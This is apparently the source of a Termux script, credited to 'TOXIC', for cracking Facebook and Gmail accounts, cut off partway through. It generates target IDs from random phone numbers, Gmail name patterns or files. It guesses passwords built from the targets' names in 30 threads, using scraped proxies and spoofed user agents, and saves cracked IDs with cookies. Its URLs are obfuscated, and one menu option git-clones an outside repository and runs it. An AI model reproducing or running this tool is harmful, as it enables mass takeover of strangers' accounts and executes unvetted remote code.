
#Coded By TOXIC (SUPRAJ)
#Facebook : SUPRAJ SHRESTHA 
#Github : SUPRAJ-8

###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform,string,bs4,zlib,base64,subprocess
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from time import sleep as reconnect
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from time import time as kontol
import hashlib
import uuid
def check_permission():
	if not os.path.exists('/data/data/com.termux/files/home/storage'):
		print(f" Permission to access storage is required.")
		print(f" Please grant storage permission.")
		result = subprocess.run(['termux-storage-get'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		if result.returncode != 0:
			print("Failed to get permission. Exiting.")
			sys.exit(1)
		else:
			print("Permission granted.")
			return True
	else:
		return True
file_path = "/sdcard/KING-Gmail-ids-with-Cookies.txt"

try:
	if not os.path.exists(file_path):
		open(file_path, 'w').close()
except Exception as e:
	pass
try:
	with open(file_path, 'r') as f:
		content = f.read()
except Exception as e:
	pass
# Example usage
id,id2,uid = [],[],[]
ses=requests.Session()
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
free = []
prem = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ualu,ualuh = [],[]
pwpluss,pwnya=[],[]
tokenku = []
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
#king script 
sys.stdout.write('\x1b]2; (TOXIC Tools) \x07')
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	print(' error')
def unoxd():
	versi_android = str(random.randint(4,12))
	versi_chrome = str(random.randint(85,105))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,150))
	model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
	build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
	ugent = f"Mozilla/5.0 (Linux; Android {versi_android}; {str(model_device)} Build/{str(build_device)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Mobile Safari/537.36"
	return ugent
realme = random.choice(["RMX2072","RMX2086","RMX3350"])
ugen0=[]
def random_user_agent():
	platforms = ["X11; Linux x86_64","Windows NT 10.0; Win64; x64","Macintosh; Intel Mac OS X 10_15_7","Android 11; Mobile"]
	browsers = ["Chrome/132.0.0.0","Firefox/121.0","Edge/119.0.0.0","Safari/537.36"]
	base = "Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) {} Safari/537.36"
	platform = random.choice(platforms)
	browser = random.choice(browsers)
	return base.format(platform, browser)

for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Build/'
	e=random.choice(["MMB29T","JZO54K","M1AJQ","KOT49H"])
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(73,112)
	h='0'
	i=random.randrange(4200,4900)
	j=random.randrange(40,150)
	k='Mobile Safari/534.36'
	l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge"])
	#l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
	m=random.randrange(1,9)
	n=random.randrange(1,9)
	o='0'
	p=random.randrange(5,20)
	uaku=(f'{a} {b}.{c}; {realme}) {d}{e}; wv) {f}{g}.{h}.{i}.{j} {k} {l}/{m}.{n}.{o}.{p}')
	ugen0.append(uaku)
countrycheck = requests.get("http://ip-api.com/json/").json()["country"]
linx = zlib.decompress(b'x^\x05\xc1A\x0b\x83 \x14\x00\xe0\x7f\xb3c\x8e@\x9f\x061\x84\x1a\x1d\xd6\xa1]\xb6v\x11W\x0f\rZ\x8a\xbeF\xfb\xf7\xfb>O\x14s\xc5\x98\x8dKA\xb8\xa2K\xf6S\x84\xe4\xd8;\x10\x80<sUJ\x05\x95\xd6ms\xdb\x83\xe9~\xc7s\xbc\x8bfB\x0f{,\xbf\xc3\xfa0\x94\xf0\xfa\x1a5\xcb\xb8\xcd=\xe6l\x1d^&o\xc9,s-\xa4\x10\x9cs\t\xeaDxP\xfd\x07AM%2').decode()

###----------[ USER AGENT PREM ]----------###
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'	
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
gen=f' {K}[{GREEN}√{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}√{K}] {P}'
rgn=f' {K}[{K}√{K}] {P}'	
method=[]
limitt=f'{dot}{K}[{H}5000{M}={H}10000{M}={H}15000{M}={H}20000{M}={H}50000{K}]{K}'
c8=f'{dot}Bd +88 [{H}017{M}={H}019{M}={H}016{M}={H}013{M}={H}018{M}={H}014{M}={H}015{P}]'
c7=f'{dot}Bd +88 [{H}0170{M}={H}0196{M}={H}0160{M}={H}0130{M}={H}0181{M}={H}0140{P}]'
c6=f'{dot}[{H}01770{M}={H}01996{M}={H}01601{M}={H}01301{M}={H}01881{M}={H}01401{P}]'
i8 = f'{dot}India +91 [{H}99{M}={H}98{M}={H}78{M}={H}93{M}={H}74{M}={H}63{M}={H}95{P}]'
i7 = f'{dot}india +91 [{H}639{M}={H}742{M}={H}957{M}={H}786{M}={H}905{M}={H}758{M}={H}764{P}]'
led = f'{B} -{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}-{M}-{B}-{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{K}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}{M}-{B}'
gfirst = f'{dot}[{H}Mahin{M}={H}Sabbir{M}={H}Jonysing{M}={H}mamun{P}]'
glast = f'{dot}[{H}Ahmed{M}={H}islam{M}={H}hasan{M}={H}kumar{P}]'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
crzy = [B,RED,GREEN,P, K,U,O,N]
warn = random.choice(crzy)
ugenn=[]
apxx=[]
uakpl=[]
gxmxl=[]
vsn = "6.0"
def banner2():
	os.system('clear')
	print(f"""{H}    \033[1;91m_____ _____  _____ ____ 
 \033[1;92m|_   _/ _ \ \/ |_ _/ ___|
 \033[1;93m  | || | | \  / | | |    
 \033[1;94m  | || |_| /  \ | | |___ 
 \033[1;95m  |_| \___/_/\_|___\____|VERSION:\u001b[36m V6\033[1;37m                                             
{RED}╔════════════════════════════════════════╗
{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} FB-KING                 {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}Mahin Ahmed             {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+8801841004250          {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/FB-KING    {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Status    {RED}: {H}Premium      {GREEN}           ║
{GREEN}║{K}[{H}•{K}] {P}Network  {RED} : {RED}({H}3G{M}/{H}4G{M}/{H}5G{RED}) {H}ON{GREEN} {RED}({H}Wifi{RED})  {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Version{RED}   : {H}{vsn} {GREEN}                  ║
{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}KING{RED}-{H}PRO      {GREEN}          ║
{RED}╚════════════════════════════════════════╝ {P}
 {K}[{H}√{K}]{P} This Is Premium Tools{RED}/{P}Command 
 {K}[{H}√{K}]{P}     {H} Enjoy {warna}KING-PRO{N}{H} User 
 {K}[{H}√{K}]{P} Successfully Update Done {H}{vsn}{P}""");print(led)
def banner():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
	print(f"""{H}   \033[1;91m_____ _____  _____ ____ 
 \033[1;92m|_   _/ _ \ \/ |_ _/ ___|
 \033[1;93m  | || | | \  / | | |    
 \033[1;94m  | || |_| /  \ | | |___ 
 \033[1;95m  |_| \___/_/\_|___\____|VERSION:\u001b[36m V6\033[1;37m                                             
{RED}╔════════════════════════════════════════╗
{GREEN}║{K}[{H}•{K}] {P}Author  {RED}  :{H} TOXIC                        {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Facebook {RED} : {H}Supraj Shrestha         {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Whatsapp  {RED}: {H}+9779819751146          {GREEN}║
{GREEN}║{K}[{H}•{K}] {P}Github   {RED} : {H}github.com/SUPRAJ-8   {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Status    {RED}: {H}Premium      {GREEN}           ║
{GREEN}║{K}[{H}•{K}] {P}Network  {RED} : {RED}({H}3G{M}/{H}4G{M}/{H}5G{RED}) {H}ON{GREEN} {RED}({H}Wifi{RED})  {GREEN}  ║
{GREEN}║{K}[{H}•{K}] {P}Version{RED}   : {H}{vsn}{H} ‌‌‌‍• {GREEN}                  ║
{GREEN}║{K}[{H}•{K}] {P}Tools   {RED}  : {H}{H}TOXIC{RED}-{H}PRO     {GREEN}          ║
{RED}╚════════════════════════════════════════╝ {P}
 {K}[{H}√{K}]{P} This Is Premium Tools{RED}/{P}Command 
 {K}[{H}√{K}]{P}     {H} Enjoy {warna}TOXIC{N}{H} User 
 {K}[{H}√{K}]{P} Successfully Update Done {H}{vsn}{P}""");print(led);print(f'{gen}Key {RED}: {A}{BN}{mpm}{N}');print(led)
cxp = 'c'+'o'+'n'+'t'+'r'+'olex'+'xp'
mpk = 'o'+'g'+'s'+'p'+'ot'
mxp = 'b'+'l'+mpk
dtc = '2023'
xzn="0"+"1"+"8"+"4"+"1"+"0"+"0"
xdnm=xzn+"4"+"2"+"5"+"0"
cokix=[]
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
idp = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = f'{idp}{xp}'
mpm = idp+'|TOXIC-PRO|'+xp[:5]
autock = idp+'|TOXIC-PRO|'+xp[:5]
sndxx=base64.b64decode(b'aHR0cHM6Ly93YS5tZS8rODgwMTg0MTAwNDI1MD90ZXh0PQ==')
xsbxd=sndxx.decode("ASCII")
# Function to run shell commands
def run_command(command):
	banner();print(f"{dot}Running{M} :{my_color} {command}{P}")
	subprocess.run(command, shell=True)
def setup_and_run():
	run_command("rm -rf FILEMAKING")
	run_command("git clone --depth=1 https://github.com/PRINCE-BRAND/FILEMAKING")
	os.chdir("FILEMAKING")
	run_command("pip install -r requirements.txt")
	run_command("python3 FILEZ.py")
try:
	amsg = par(requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/\xd5+\xc9\xd7\xf720\x8e\xf4\x0c\x04\x00B5\x06!'),verify=True).text,'html.parser')	
except Exception as e:
	print(e);print(f'{rgen}Check Your Internet..');exit()
for xt3x in amsg.find_all('div',class_='post-body entry-content float-container'):
	zyx = xt3x.text
announce = zyx.strip()
def firstck():
	pass
import os
numberd = '8801841004250'
file_name = ".name.txt"
if os.path.exists(file_name):
	with open(file_name, "r") as f:
		saved_name = f.read().strip()
	banner();print(f"{dot}Welcome back {M}: {H}{saved_name}{P}{M}!");time.sleep(4)
else:
	banner()
	regs = input(f'{dot} Name For registration {M}:{H} ')
	with open(file_name, "w") as f:
		f.write(regs)
	banner()
	adt = f"Hi%20FB-TOXIC%20Owner%20My%20Reg%20name%20is%20:%20{regs}"
	os.system(f'termux-open {xsbxd}{adt}')
	sys.exit()
#key
xkey="TOXIC="+xp[:8]
kxd = str(xp[:8])
correct_password = xkey
try:
	model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
except:
	model = "Unknown"
kex = model+'='+kxd[2:-2]
usrb = model+'-25800131-'+kxd[2:-2]
usrm = model+'-13175669-'+kxd[2:-2]
usrd = model+'-36507569-'+kxd[2:-2]
def keyck():
	pass
def passkey(mht):
	pass
#PUBLIC CLONE SYSTEM START LINES
def loginkey(mht):
	pass
def cserver():
	pass

def buy():
	pass
#PULBIC CLONE SYSTEM END      
def hack(mht):
	firstck();cserver();keyck()
	banner();print(f"{K} [{H}1{K}] {WHITE}Public File Make {RED}[{H}New{RED}]{P} ");print(f"{K} [{H}2{K}] {WHITE}Public Clone     {RED}[{H}FF{RED}]{P} ");print(f"{K} [{H}3{K}] {WHITE}File Clone       {RED}[{H}V4{RED}]{P}");print(f"{K} [{H}4{K}] {WHITE}Random Clone     {RED}[{H}New{RED}]{P}");print(f"{K} [{H}5{K}] {WHITE}Report Problem   {RED}[{H}Send{RED}]{P} ");print(f"{K} [{H}0{K}] {WHITE}Exit Program     {RED}[{H}Tools{RED}]{P} ");print(led)
	mahin = input(f'{dot}Select menu {M}:{H} ')
	os.system(f'termux-open https://www.facebook.com/groups/king.official.bd/?ref=share&mibextid=NSMWBT')
	if mahin in ["1","01"]:setup_and_run()
	elif mahin in ["2","02"]:exit() 
	elif mahin in ["3","03"]:flcln(mahin)
	elif mahin in ["4","04"]:brndm(mht)
	elif mahin in ["5","05"]:os.system('xdg-open https://www.facebook.com/share/1DxPN2Dpf8/');os.system('xdg-open https://wa.me/8801841004250');exit()
	elif mahin in ["0","00"]:exit()
	else:os.system('termux-open https://www.facebook.com/groups/king.official.bd/?ref=share&mibextid=NSMWBT');exit()
def brndm(mht):
	banner();print(f"{K} [{H}1{K}] {WHITE}Random  {M}[{H}8-Digit{M}]{P} ");print(f"{K} [{H}2{K}] {WHITE}Random  {M}[{H}7-Digit{M}]{P} ");print(f"{K} [{H}3{K}] {WHITE}Random  {M}[{H}6-Digit{M}]{P}");print(f"{K} [{H}4{K}] {WHITE}Random  {M}[{H}Gmail{M}]{P}");print(f"{K} [{H}5{K}] {WHITE}Back To {M}[{H}Home{M}]{P}");print(f"{K} [{H}6{K}] {WHITE}Exit Tools {P} ");print(led)
	mahin = input(f'{dot}Select menu {M}:{H} ')
	if mahin in ["1","01"]:rd8(mht)
	elif mahin in ["2","02"]:rd7(mht) 
	elif mahin in ["3","03"]:rd6(mht)
	elif mahin in ["4","04"]:xmilg(mahin)
	elif mahin in ["5","05"]:hack(mht)
	elif mahin in ["6","06"]:os.system('clear');exit()
	else:exit()
#METHOD X COOKIES X APPLICATION
rlist=[]
def flcln(mahin):
	banner();keyck();gxmxl.append('File')
	try:
		fileX = input(f"{dot}Input File{RED} :{H} ")
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		banner()
		cserver()
		cokixx=input(f'{dot}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ');print(led)
		if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
		banner();print(f'{K} [{H}1{K}] {P}Method ({H}M-{H}1{P}){P}');print(f'{K} [{H}2{K}] {P}Method ({H}M-{H}2{P}){P}');print(f'{K} [{H}3{K}] {P}Method ({H}M-3{H}{P}){P}');print(f'{K} [{H}4{K}] {P}Method ({H}New{P}){P}');print(led)
		hxc = input(f'{dot}Choose {RED}: {H}')
		if hxc in ['1','01']:method.append('m1')
		elif hxc in ['2','02']:method.append('m2')
		elif hxc in ['3','03']:method.append('m3')
		else:method.append('m4')
		banner();print(f'{K} [{H}1{K}] {P}Password ({H}Choose{P}){P}');print(f'{K} [{H}2{K}] {P}Password ({H}Auto{P}){P}');print(led)
		mahinpass = input(f'{dot}Choose {RED}: {H}')
		if mahinpass in ['1','01']:
			banner()
			try:
				ps_limit = int(input(f'{dot}Password Limit {N}({H}1-30{N}){M} :{H} '))
			except:
				ps_limit =1
			banner();print(f'{dot}{H}first,last,first last,first1234,last123,names{P}');print(led)
			for i in range(ps_limit):
				rlist.append(input(f'{gen}Put Pass {GREEN}{i+1}{RED} :{H} '))
			with tred(max_workers=30) as sendxd:
				banner()
				os.system("clear");banner();print(f'{N}{dot}File ids{RED}  : {H}'+str(len(id)));print(f'{N}{dot}Method {RED}   : {H}'+hxc);print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}');print(led)
				for kingxpro in id:
					idf,names = kingxpro.split('|')
					pwv = rlist
					if 'm1' in method:sendxd.submit(filem1,idf,pwv,names)
					elif 'm2' in method:sendxd.submit(filem2,idf,pwv,names)
					elif 'm3' in method:sendxd.submit(filem3,idf,pwv,names)
					else:sendxd.submit(filem4,idf,pwv,names)
			print('');print(f'{gen}Hi Dear User Crack process has been completed');print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ');exit()
		elif mahinpass in ['2','02']:
			rlist.append('first123')
			rlist.append('first12')
			rlist.append('first1234')
			rlist.append('firstlast')
			rlist.append('first last')
			rlist.append('last12')
			rlist.append('last123')
			rlist.append('last1234')
			rlist.append('First Last')
			with tred(max_workers=30) as sendxd:
				banner()
				os.system("clear");banner();print(f'{N}{dot}File ids{RED}  : {H}'+str(len(id)));print(f'{N}{dot}Method {RED}   : {H}'+hxc);print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}');print(led)
				for kingxpro in id:
					idf,names = kingxpro.split('|')
					pwv = rlist
					if 'm1' in method:sendxd.submit(filem1,idf,pwv,names)
					elif 'm2' in method:sendxd.submit(filem2,idf,pwv,names)
					elif 'm3' in method:sendxd.submit(filem3,idf,pwv,names)
					else:sendxd.submit(filem4,idf,pwv,names)
			print('');print(f'{gen}Hi Dear User Crack process has been completed');print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ');exit()
		else:banner();print(f'{rgen}Hello Brother something wrong');exit()
	except IOError:
		print(led);print(f"\nFile %s not found"%(fileX))
		exit()
def xmilg(mahin):
	banner();keyck()
	gxmxl.append('Gmail')
	try:
		banner();print(gfirst);print(led)
		firsx = input(f'{dot}First Name {M}: {H}')
		print(led);print(glast);print(led)
		lasx = input(f'{dot}Last Name {M}: {H}');print(led)
		domain = "@gmail.com"
		banner();print(limitt);print(led)
		try:
			crk=int(input(f'{dot}Put Limit{M} :{H} '))
		except ValueError:
			crk = 5000
		lists = ['3','4']		
		for xd in range(crk):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail1x = ''.join(random.choice(string.digits) for _ in range(1))
				mail2x = ''.join(random.choice(string.digits) for _ in range(2))
				id.append(firsx.lower()+lasx.lower()+mail2x+mail1x+domain+'|'+firsx+' '+lasx)
			else:
				mail11xx = ''.join(random.choice(string.digits) for _ in range(2))
				mail2xx = ''.join(random.choice(string.digits) for _ in range(2))
				id.append(firsx.lower()+lasx.lower()+mail2xx+mail11xx+domain+'|'+firsx+' '+lasx)
		banner()
		cokixx=input(f'{dot}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ');print(led)
		if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
		banner();print(f'{K} [{H}1{K}] {P}Method ({H}M-1{P}){P}');print(f'{K} [{H}2{K}] {P}Method ({H}M-2{P}){P}');print(f'{K} [{H}3{K}] {P}Method ({H}M-{H}3{P}){P}');print(f'{K} [{H}4{K}] {P}Method ({H}New{P}){P}');print(led)
		hxc = input(f'{dot}Choose {RED}: {H}')
		if hxc in ['1','01']:method.append('m1')
		elif hxc in ['2','02']:method.append('m2')
		elif hxc in ['3','03']:method.append('m3')
		else:pass
		banner();print(f'{gen}Targeted Gmail {M}: {H}{firsx} {lasx}');print(led);print(f'{K} [{H}1{K}] {P}Password ({H}Choose{P}){P}');print(f'{K} [{H}2{K}] {P}Password ({H}Auto{P}){P}');print(led)
		mahinpass = input(f'{dot}Choose {RED}: {H}')
		if mahinpass in ['1','01']:
			banner()
			try:
				ps_limit = int(input(f'{dot}Password Limit {N}({H}1-30{N}){M} :{H} '))
			except:
				ps_limit =1
			banner();print(f'{dot}{H}first,last,first last,first1234,last123,names{P}');print(led)
			for i in range(ps_limit):
				rlist.append(input(f'{gen}Put Pass {GREEN}{i+1}{RED} :{H} '))
			with tred(max_workers=30) as sendxd:
				banner()
				os.system("clear");banner();print(f'{N}{dot}Gmail ids{RED} : {H}'+str(len(id)));print(f'{N}{dot}Method {RED}   : {H}'+hxc);print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}');print(led)
				for kingxpro in id:
					idf,names = kingxpro.split('|')
					pwv = rlist
					if 'm1' in method:sendxd.submit(filem1,idf,pwv,names)
					elif 'm2' in method:sendxd.submit(filem2,idf,pwv,names)
					elif 'm3' in method:sendxd.submit(filem3,idf,pwv,names)
					else:sendxd.submit(filem4,idf,pwv,names)
			print('');print(f'{gen}Hi Dear User Crack process has been completed');print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ');exit()
		elif mahinpass in ['2','02']:
			banner();print(f'{gen}Targeted Gmail Name {M}: {H}{firsx} {lasx}');print(led);print(f'{K} [{H}1{K}] {P}Focus {B}({H}First Name{B}){P} Pass{P}');print(f'{K} [{H}2{K}] {P}Focus {B}({H}Last Name{B}){P} Pass{P}');print(f'{K} [{H}3{K}] {P}Focus {B}({H}Full Name{B}){P} Pass{P}');print(led)
			mtd = input(f'{dot}Focus Pass {M}: {H}');print(led)
			if mtd in ['1','01']:
				rlist.append('first12')
				rlist.append('first123')
				rlist.append('first1234')
				rlist.append('first 123')
				rlist.append('first 1234')
				rlist.append('firstlast')
				rlist.append('first last')
				rlist.append('first12345')
				rlist.append('first@123')
				rlist.append('first@1234')
				rlist.append('First Last')
				rlist.append('firstlast123')
				rlist.append('firstlast1234')
			elif mtd in ["2","02"]:
				rlist.append('last12')
				rlist.append('last123')
				rlist.append('last1234')
				rlist.append('last 123')
				rlist.append('last 1234')
				rlist.append('firstlast')
				rlist.append('first last')
				rlist.append('last12345')
				rlist.append('last@123')
				rlist.append('last@1234')
				rlist.append('last Last')
				rlist.append('firstlast123')
				rlist.append('firstlast1234')
			else:
				rlist.append('first1234')
				rlist.append('first123')
				rlist.append('first12345')
				rlist.append('first12')
				rlist.append('first 123')
				rlist.append('first 12345')
				rlist.append('first 1234')
				rlist.append('first@123')
				rlist.append('first@1234')
				rlist.append('firstlast')
				rlist.append('first last')
				rlist.append('First Last')
				rlist.append('firstlast123')
				rlist.append('firstlast1234')
				rlist.append('firstlast 123')
				rlist.append('firstlast 1234')
				rlist.append('firstlast@123')
			with tred(max_workers=30) as sendxd:
				banner()
				os.system("clear");banner();print(f'{N}{dot}Gmail ids{RED} : {H}'+str(len(id)));print(f'{N}{dot}Method {RED}   : {H}'+hxc);print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}');print(led)
				for kingxpro in id:
					idf,names = kingxpro.split('|')
					pwv = rlist
					if 'm1' in method:sendxd.submit(filem1,idf,pwv,names)
					elif 'm2' in method:sendxd.submit(filem2,idf,pwv,names)
					elif 'm3' in method:sendxd.submit(filem3,idf,pwv,names)
					else:sendxd.submit(filem4,idf,pwv,names)
			print('');print(f'{gen}Hi Dear User Crack process has been completed');print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ');exit()
		else:banner();print(f'{rgen}Hello Brother something wrong');exit()
	except:
		print(led);print(f"{dot}Something Wrong...")
		exit()
def rd8(mht):
	os.system('clear');banner();print(c8);print(led);print(i8);print(led)
	cxd = input(f'{dot}Put Code {M}: {H}');print(led)
	banner();print(limitt);print(led)
	try:
		crk=int(input(f'{dot}Put Limit{M} :{H} '))
	except ValueError:
		crk = 5000
	for phone in range(crk):
		sxd = ''.join(random.choice(string.digits) for _ in range(8))
		id.append(cxd+sxd+'|'+cxd+sxd)
	rdmpass(cxd,id)
def rd7(mht):
	os.system('clear');banner();print(c7);print(led);print(i7);print(led) 
	cxd = input(f'{dot}Put Code {M}: {H}');print(led)
	banner();print(limitt);print(led)
	try:
		crk=int(input(f'{dot}Put Limit{M} :{H} '))
	except ValueError:
		crk = 5000
	for phone in range(crk):
		sxd = ''.join(random.choice(string.digits) for _ in range(7))
		id.append(cxd+sxd+'|'+cxd+sxd)
	rdmpass(cxd,id)
def rd6(mht):
	os.system('clear');banner();print(c6);print(led) #print(c8);print(led)
	cxd = input(f'{dot}Put Code {M}: {H}');print(led)
	banner();print(limitt);print(led)
	try:
		crk=int(input(f'{dot}Put Limit{M} :{H} '))
	except ValueError:
		crk = 5000
	for phone in range(crk):
		sxd = ''.join(random.choice(string.digits) for _ in range(6))
		id.append(cxd+sxd+'|'+cxd+sxd)
	rdmpass(cxd,id)
def rdmpass(cxd,id):
	try:
		banner()
		cokixx=input(f'{dot}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ');print(led)
		if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
		banner();print(f'{gen}{H}Recommend {P}({K}N{P}) Account lock Chance {M}99%{P} ');print(led)
		apx=input(f'{dot}Cloning Show Application  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ');print(led)
		if apx in ['y','Y','yes','Yes','1']:apxx.append('y')
		else:apxx.append('n')
		banner();print(f'{K} [{H}1{K}] {P}Method ({H}M-1{P}){P}');print(f'{K} [{H}2{K}] {P}Method ({H}M-2{P}){P}');print(f'{K} [{H}3{K}] {P}Method ({H}M-{H}3{P}){P}');print(f'{K} [{H}4{K}] {P}Method ({H}New{P}){P}');print(led)
		hxc = input(f'{dot}Choose {RED}: {H}')
		if hxc in ['1','01']:method.append('m1')
		elif hxc in ['2','02']:method.append('m2')
		elif hxc in ['3','03']:method.append('m3')
		else:pass
		banner();print(f'{gen}Targeted Short Number {M}: {H}{cxd}{M}xxx');print(led);print(f'{K} [{H}1{K}] {P}Password ({H}Choose{P}){P}');print(f'{K} [{H}2{K}] {P}Password ({H}Auto{P}){P}');print(led)
		mahinpass = input(f'{dot}Choose {RED}: {H}')
		if mahinpass in ['1','01']:
			banner()
			try:
				ps_limit = int(input(f'{dot}Password Limit {N}({H}1-30{N}){M} :{H} '))
			except:
				ps_limit =1
			banner();print(f'{dot}{H}first6,first7,first8,number,last6,last7,last8{P}');print(led)
			for i in range(ps_limit):
				rlist.append(input(f'{gen}Put Pass {GREEN}{i+1}{RED} :{H} '))
			with tred(max_workers=30) as sendxd:
				banner()
				os.system("clear");banner();print(f'{N}{dot}Random ids{RED} : {H}'+str(len(id)));print(f'{N}{dot}Method opt{RED} : {H}'+hxc);print(f'{N}{dot}Airplane Mode On Off For More {RED}({warna}ids{RED}){N}');print(led)
				for kingxpro in id:
					idf,names = kingxpro.split('|')
					pwv = rlist
					if 'm1' in method:sendxd.submit(rdm1,idf,pwv,names)
					elif 'm2' in method:sendxd.submit(rdm2,idf,pwv,names)
					elif 'm3' in method:sendxd.submit(rdm3,idf,pwv,names)
					else:sendxd.submit(rdm4,idf,pwv,names)
			print('');print(f'{gen}Hi Dear User Crack process has been completed');print(f'{gen}Total ok {B}:{GREEN}{ok}\n{rgen}Total cp {B}: {RED}{cp} ');exit()
		elif mahinpass in ['2','02']:
			banner();print(f'{K} [{H}1{K}] {P}Password ({H}BD-Auto{P}){P}');print(f'{K} [{H}2{K}] {P}Password ({H}Ind-Auto{P}){P}');print(f'{K} [{H}3{K}] {P}Password ({H}Npl-Auto{P}){P}');print(f'{K} [{H}4{K}] {P}Password ({H}Iraq-Auto{P}){P}');print(f'{K} [{H}5{K}] {P}Password ({H}All-Auto{P}){P}');print(led)
			mtd = input(f'{dot}Choose Pass {M}: {H}');print(led)
			if mtd in ['1','01']:
				rlist.append('first6')
				rlist.append('first7')
				rlist.append('first8')
				rlist.append('last6')
				rlist.append('last7')
				rlist.append('last8')
				rlist.append('number')
				rlist.append('Bangladesh')
				rlist.append('@#@#@#')
				rlist.append('bangla')
				rlist.append('free fire')
			elif mtd in ["2","02"]:
				rlist.append('first6')
				rlist.append('first7')
				rlist.append('first8')
				rlist.append('number')
				rlist.append('last8')
				rlist.append('last7')
				rlist.append('last6')
